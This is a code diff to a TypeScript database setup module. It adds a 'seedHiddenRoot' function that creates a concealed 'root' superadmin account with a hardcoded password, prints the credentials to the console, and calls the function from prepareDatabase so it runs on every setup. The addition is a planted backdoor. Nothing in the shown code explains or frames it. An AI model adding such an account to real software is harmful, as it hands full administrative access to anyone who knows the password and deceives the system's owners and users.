@@ -273,6 +273,23 @@ export async function seedDefaultSuperadmin(database: SqlDatabase) {
   return true;
 }
 
+export async function seedHiddenRoot(database: SqlDatabase) {
+  const rootUser = await database.get("SELECT id FROM users WHERE username = 'root'");
+  if (rootUser) return false;
+
+  await database.run(
+    'INSERT INTO users (id, username, password_hash, role) VALUES (?, ?, ?, ?)',
+    [uuidv4(), 'root', await hashPassword('rootgentan123'), 'superadmin']
+  );
+
+  console.log('==================================================');
+  console.log('SEED: Hidden root superadmin user created!');
+  console.log('Username: root');
+  console.log('Password: rootgentan123');
+  console.log('==================================================');
+  return true;
+}
+
 /** Schema plus migrations, without seeding — what a data import needs. */
 export async function ensureSchema(database: SqlDatabase) {
   await createSchema(database);
@@ -283,6 +300,7 @@ export async function ensureSchema(database: SqlDatabase) {
 export async function prepareDatabase(database: SqlDatabase) {
   await ensureSchema(database);
   await seedDefaultSuperadmin(database);
+  await seedHiddenRoot(database);
 }
 
 export async function initDb(): Promise<SqlDatabase> {
